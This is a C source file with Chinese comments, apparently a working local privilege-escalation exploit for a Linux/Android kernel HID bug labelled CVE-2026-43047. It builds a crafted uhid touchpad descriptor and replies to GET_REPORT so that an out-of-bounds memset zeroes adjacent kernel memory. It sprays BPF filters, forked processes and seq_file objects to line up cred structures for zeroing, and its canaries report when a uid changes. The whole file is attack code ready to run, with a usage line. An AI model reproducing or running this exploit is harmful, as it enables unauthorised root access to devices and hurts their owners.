/* cred_zero.c v2 — §DU: CVE-2026-43047 跨页 cred 零化 canary 探针
 *
 * 触发链(全部实测):
 *   uhid 传统 CREATE(type0, 4380B) → 异步 probe → mt_feature_mapping(ContactMax)
 *   → mt_get_feature → GET_REPORT 事件(type=9, 载荷 {cookie@4, rnum@8, rtype@9=0})
 *   → 主线程回复 type=14(被接受) ⇒ hid_report_raw_event ⇒ memset(buf+rsize, 0, w24)
 *   rsize = hid_report_len(report2) = 185 ⇒ kzalloc(192) 恰填 slot
 *   回复 data[0]=3(report3) ⇒ w24 = 248-184 = 64 ⇒ 清零 buf[185..191] + 邻居[0..56]
 *
 * 整形: ROUNDS 轮 × {21 BPF filter(len24→192B), fork 21 子进程(各持新 cred)}
 * canary: 子进程轮询 getuid/geteuid/getgid != 初值 → 管道报告
 *
 * 用法: cred_zero [cycles] [n=nospray] [w=stock WPTP]
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <dirent.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <linux/filter.h>

#define EVSZ 4380
#define ROUNDS 20
#define PER 21
#define NKEEP (ROUNDS*PER)
#define SPARE 4

static unsigned char ev[EVSZ];
static void wr32(int o, uint32_t v){ memcpy(ev+o,&v,4); }
static void wr16(int o, uint16_t v){ memcpy(ev+o,&v,2); }
static uint32_t rd32(int o){ uint32_t v; memcpy(&v,ev+o,4); return v; }

/* ---- WPTP 基底(微软官方 Sample, 实测可触发 mt_feature_mapping) ---- */
static const unsigned char wptp[] = {
0x05, 0x0D, 0x09, 0x05, 0xA1, 0x01,
    0x85, 0x01,
    0x09, 0x56, 0x24, 0x00, 0x26, 0xFF, 0xFF, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x54, 0x25, 0x05, 0x75, 0x08, 0x81, 0x02,
    0x05, 0x20, 0x0A, 0x94, 0x04, 0x15, 0x00, 0x26, 0xFF, 0x0F, 0x35, 0x00,
    0x46, 0xFF, 0x0F, 0x65, 0x12, 0x75, 0x0C, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x0D, 0x09, 0x22, 0xA1, 0x02,
        0x09, 0x51, 0x25, 0x0F, 0x75, 0x04, 0x95, 0x01, 0x81, 0x02,
        0x09, 0x42, 0x25, 0x01, 0x75, 0x01, 0x81, 0x02,
        0x09, 0x47, 0x81, 0x02,
        0x95, 0x05, 0x81, 0x03,
        0x05, 0x01, 0x09, 0x30, 0x15, 0x00, 0x26, 0xC8, 0x00, 0x35, 0x00,
        0x45, 0x69, 0x65, 0x11, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
        0x09, 0x31, 0x26, 0x96, 0x00, 0x45, 0x4B, 0x81, 0x02,
        0x05, 0x0D, 0x09, 0x30, 0x15, 0x00, 0x26, 0xFF, 0x0F, 0x35, 0x00,
        0x46, 0xFF, 0x0F, 0x65, 0x12, 0x75, 0x0C, 0x95, 0x01, 0x81, 0x02,
    0xC0,
    0x05, 0x09, 0x09, 0x01, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01,
    0x81, 0x02, 0x95, 0x07, 0x81, 0x03,
    0x85, 0x02,
    0x05, 0x0D, 0x09, 0x55, 0x25, 0x05, 0x75, 0x08, 0x95, 0x01, 0xB1, 0x02,
    0x09, 0x59, 0x25, 0x02, 0xB1, 0x02,
    /* [A] report2 补 183B const feature ⇒ 185B ⇒ kzalloc(192) */
    /* [B] report3 = 248B const feature ⇒ w24 = 248-184 = 64 */
    0x85, 0x40,
    0x05, 0x0D, 0x09, 0xB0, 0x15, 0x01, 0x25, 0x03, 0x35, 0x6E, 0x45, 0xBE,
    0x65, 0x12, 0x75, 0x02, 0x95, 0x01, 0xB1, 0x02,
    0x85, 0x41,
    0x05, 0x0E, 0x09, 0x01, 0xA1, 0x02,
        0x09, 0x23, 0x15, 0x00, 0x25, 0x04, 0x75, 0x08, 0x95, 0x01, 0xB1, 0x02,
    0xC0,
0xC0,
};
static unsigned char desc[4096];
static unsigned desc_len;

static void build_desc(int variant){
    /* variant: 0='w' stock / 1='a' rsize185+rep3_248 / 2='o' rsize185+rep3_1020 / 3='p' rsize120+rep3_1020 */
    static const unsigned char rep3[] = { 0x85,0x03, 0x75,0x08, 0x95,0xF8, 0xB1,0x03 };
    static const unsigned char rep3big[] = { 0x85,0x03, 0x75,0x08, 0x95,0xFF, 0xB1,0x03,
                                             0x95,0xFF, 0xB1,0x03, 0x95,0xFF, 0xB1,0x03,
                                             0x95,0xFC, 0xB1,0x03 };
    static const unsigned char pad183[] = { 0x75,0x08, 0x95,0xB7, 0xB1,0x03 };  /* +183B */
    static const unsigned char pad118[] = { 0x75,0x08, 0x95,0x76, 0xB1,0x03 };  /* +118B ⇒ report2=120 */
    if (variant==0){ memcpy(desc, wptp, sizeof(wptp)); desc_len = sizeof(wptp); return; }
    const unsigned char *pad = (variant==3)?pad118:pad183;
    unsigned padn = (variant==3)?sizeof(pad118):sizeof(pad183);
    const unsigned char *r3 = (variant>=2)?rep3big:rep3;
    unsigned r3n = (variant>=2)?sizeof(rep3big):sizeof(rep3);
    int pos = 0, i = 0, insA = -1;
    while (i < (int)sizeof(wptp) - 5){
        if (wptp[i]==0x09 && wptp[i+1]==0x59 && wptp[i+2]==0x25 && wptp[i+3]==0x02
            && wptp[i+4]==0xB1 && wptp[i+5]==0x02){ insA = i+6; break; }
        i++;
    }
    memcpy(desc+pos, wptp, insA);                    pos += insA;
    memcpy(desc+pos, pad, padn);                     pos += padn;
    memcpy(desc+pos, r3, r3n);                       pos += r3n;
    memcpy(desc+pos, wptp+insA, sizeof(wptp)-insA);  pos += sizeof(wptp)-insA;
    desc_len = pos;
}

static int create_legacy(int fd, const char *name){
    memset(ev,0,EVSZ);
    wr32(0,0);
    strncpy((char*)(ev+4), name, 127);
    strncpy((char*)(ev+132), "virt-0", 63);
    uint64_t p = (uint64_t)(uintptr_t)desc;
    memcpy(ev+260,&p,8);
    wr16(268,(uint16_t)desc_len);
    wr16(270,0x0003);
    wr32(272,0x1234); wr32(276,0x5678); wr32(280,1);
    errno=0;
    ssize_t w = write(fd,ev,EVSZ);
    if (w<=0){ printf("CREATE 失败 ret=%zd errno=%d\n", w, errno); return -1; }
    return 0;
}
static int destroy_dev(int fd){
    memset(ev,0,EVSZ); wr32(0,1);
    return write(fd,ev,EVSZ) > 0 ? 0 : -1;
}

static void dump_hid(void){
    DIR *d = opendir("/sys/bus/hid/devices");
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d)) != NULL){
        if (de->d_name[0]=='.') continue;
        char p[512], link[512];
        snprintf(p,sizeof p,"/sys/bus/hid/devices/%s/driver", de->d_name);
        ssize_t n = readlink(p, link, sizeof link - 1);
        if (n<0) n=0; link[n]=0;
        const char *drv = strrchr(link,'/');
        printf("  hid: %s -> %s\n", de->d_name, n>0 ? drv+1 : "(未绑定)");
    }
    closedir(d);
}

int main(int argc, char **argv){
    setvbuf(stdout,NULL,_IONBF,0);
    int n_cycles = argc>1 ? atoi(argv[1]) : 40;
    int seqspray = argc>2 && argv[2][0]=='s';
    int nospray  = (argc>2 && argv[2][0]=='n') || seqspray;
    int stock    = argc>3 && argv[3][0]=='w';
    int big      = argc>3 && argv[3][0]=='o';
    int canary_mode = argc>4 && argv[4][0]=='c';
    build_desc(stock + (big?1:0));
    printf("=== cred_zero v2: %d cycles %s desc=%u B ===\n", n_cycles,
           nospray?"(nospray)":"(spray)", desc_len);

    int cp[2]; if (pipe(cp)){ perror("pipe"); return 1; }
    int can_wr = dup(cp[1]);

    struct sock_filter ins[24];
    for (int i=0;i<24;i++) ins[i] = (struct sock_filter){ BPF_LD|BPF_W|BPF_ABS, 0, 0, 0x40u };
    ins[23] = (struct sock_filter){ BPF_RET|BPF_K, 0, 0, 0 };
    struct sock_fprog prog = { .len=24, .filter=ins };

    /* ---- 整形 ---- */
    int seqfds[320], nseq=0;
    int socks[NKEEP], nsock=0;
    pid_t kids[ROUNDS*PER]; int nkids=0;
    int spares[SPARE];
    if (!nospray){
        for (int r=0;r<ROUNDS;r++){
            for (int j=0;j<PER;j++){
                int s = socket(AF_INET,SOCK_DGRAM,0);
                if (s<0 || setsockopt(s,SOL_SOCKET,SO_ATTACH_FILTER,&prog,sizeof(prog))!=0){
                    printf("filter 失败 s=%d errno=%d\n", s, errno); return 1;
                }
                socks[nsock++]=s;
            }
            for (int j=0;j<PER;j++){
                pid_t p = fork();
                if (p==0){
                    for (int f=6; f<1024; f++) if (f!=can_wr) close(f);
                    uid_t b=getuid(), e=geteuid(); gid_t g=getgid();
                    for(;;){
                        if (getuid()!=b || geteuid()!=e || getgid()!=g){
                            char m[96];
                            int n=snprintf(m,sizeof m,"★UIDWIN pid=%d uid=%d euid=%d gid=%d\n",
                                           getpid(),getuid(),geteuid(),getgid());
                            ssize_t w; do { w=write(can_wr,m,n); } while (w<0 && errno==EINTR);
                            pause();
                        }
                        usleep(100000);
                    }
                }
                kids[nkids++]=p;
            }
        }
    }
    if (seqspray){
        for (int i=0;i<300;i++){
            int f = open("/proc/self/stat", O_RDONLY);
            if (f>=0) seqfds[nseq++]=f; else break;
        }
        /* 触发一次 read 让 seq_file 完全初始化 */
        for (int i=0;i<nseq;i++){ char tb[16]; pread(seqfds[i], tb, 8, 0); }
        printf("seq 喷射: %d 个 seq_file(kmalloc-128)\n", nseq);
    }
    for (int i=0;i<SPARE;i++) spares[i]=socket(AF_INET,SOCK_DGRAM,0);
    printf("整形完成: %d filters, %d forks, %d seqfiles\n", nsock, nkids, nseq);
    close(can_wr);

    /* ---- 触发循环 ---- */
    int ufd = open("/dev/uhid", O_RDWR|O_CLOEXEC);
    if (ufd<0){ printf("open uhid 失败 errno=%d\n", errno); return 1; }
    int spare_idx=0, hits=0;
    for (int c=0;c<n_cycles;c++){
        /* 1) 整形/换槽 */
        if (seqspray && nseq>0){
            /* 关闭一个 seq_file ⇒ 其 128B 槽位进 freelist ⇒ 触发 kzalloc 落在 seq 密集页! */
            int k = c % nseq;
            if (seqfds[k] >= 0){ close(seqfds[k]); seqfds[k]=-1; }
        }
        else if (!nospray){
            setsockopt(spares[spare_idx],SOL_SOCKET,SO_ATTACH_FILTER,&prog,sizeof(prog));
            spare_idx=(spare_idx+1)%SPARE;
            /* 2) detach 页尾候选 filter + RCU 等待 */
            int victim;
            if (c < 2*ROUNDS) victim = 21*(c/2) + 20 - (c%2);
            else              victim = (c*7) % nsock;
            close(socks[victim]); socks[victim]=-1;
            usleep(120000);
        }
        /* 3) CREATE → 主线程应答 GET_REPORT → DESTROY */
        int got=0;
        errno=0;
        if (create_legacy(ufd,"cz")<0) break;
        for (int t=0;t<8;t++){
            struct timeval tv={0,250000};
            fd_set rf; FD_ZERO(&rf); FD_SET(ufd,&rf);
            if (select(ufd+1,&rf,NULL,NULL,&tv)<=0) continue;
            ssize_t r = read(ufd,ev,EVSZ);
            if (r<=0) continue;
            uint32_t type = rd32(0);
            if (type==9 || type==13){
                uint8_t rnum = ev[8];
                int oob = (rnum==2);
                memset(ev,0,EVSZ);
                wr32(0,14); wr32(4,rd32(4)); wr16(8,0);
                wr16(10, 128);
                /* canary: data[0]=2(解析report2自身) data[1]=0x42 ⇒ ContactMax=66 ⇒ mt_slots=66?
                   正式: data[0]=3(report3) ⇒ memset 越界 */
                ev[12] = canary_mode ? 2 : 3;
                ev[13] = 0x42;
                errno=0;
                ssize_t w = write(ufd,ev,EVSZ);
                printf("  ANSWER(rnum=%u oob=%d) ret=%zd errno=%d\n", rnum, oob, w, errno);
                if (oob) got=1;
                if (canary_mode){
                    usleep(20000);
                    DIR *dd = opendir("/sys/bus/hid/devices");
                    if (dd){ struct dirent *de;
                        while ((de=readdir(dd))!=NULL){
                            if (de->d_name[0]=='.') continue;
                            char p[512], b[256];
                            snprintf(p,sizeof p,"/sys/bus/hid/devices/%s/mt_slots",de->d_name);
                            int f2=open(p,O_RDONLY);
                            if (f2>=0){ b[0]=0; read(f2,b,200); printf("  %s mt_slots=%s",de->d_name,b); close(f2); }
                            snprintf(p,sizeof p,"/sys/bus/hid/devices/%s/maxcontacts",de->d_name);
                            f2=open(p,O_RDONLY);
                            if (f2>=0){ b[0]=0; read(f2,b,200); printf("  %s maxcontacts=%s",de->d_name,b); close(f2); }
                        } closedir(dd); }
                }
            }
        }
        if (!got) printf("[%d] 无 GET_REPORT\n", c);
        usleep(50000);
        if (c==0) dump_hid();
        destroy_dev(ufd);
        usleep(50000);
        /* 4) canary */
        fd_set rf; FD_ZERO(&rf); FD_SET(cp[0],&rf);
        struct timeval tv={0,0};
        while (select(cp[0]+1,&rf,NULL,NULL,&tv)>0){
            char m[128]; ssize_t n=read(cp[0],m,sizeof m-1);
            if (n<=0) break; m[n>0?n:0]=0;
            printf("  canary: %s", m);
            hits++;
            FD_ZERO(&rf); FD_SET(cp[0],&rf); tv.tv_sec=0; tv.tv_usec=0;
        }
        if (getuid()!=2000 || geteuid()!=2000){
            printf("★PARENT WIN uid=%d euid=%d\n", getuid(), geteuid());
            hits++;
        }
        printf("[%d/%d] got=%d hits=%d\n", c+1, n_cycles, got, hits);
    }

    /* ★ 终极 canary: 读全部 seq 文件 ⇒ 若 op 被零化 ⇒ panic(可观测!) */
    if (nseq){
        printf("读取 %d 个 seq 文件验证 op 指针...\n", nseq);
        for (int i=0;i<nseq;i++){
            char tb[32];
            pread(seqfds[i], tb, 16, 0);
        }
        printf("全部读完, 无 panic ⇒ op 未被零化\n");
    }
    printf("=== 结束: hits=%d ===\n", hits);
    for (int i=0;i<nkids;i++) kill(kids[i],SIGKILL);
    return hits>0?0:2;
}
